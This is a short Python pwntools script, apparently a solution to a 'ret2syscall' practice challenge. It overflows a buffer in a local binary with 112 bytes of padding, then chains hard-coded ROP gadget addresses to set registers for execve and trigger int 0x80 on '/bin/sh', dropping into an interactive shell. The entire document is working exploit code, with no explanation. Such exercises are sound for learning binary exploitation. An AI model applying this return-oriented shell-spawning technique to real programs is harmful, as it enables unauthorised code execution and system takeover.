from pwn import *

sh = process('./ret2syscall')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408

payload = 'a'*112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80)

#payload = flat(
#    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, #binsh, int_0x80])


sh.sendline(payload)
sh.interactive()

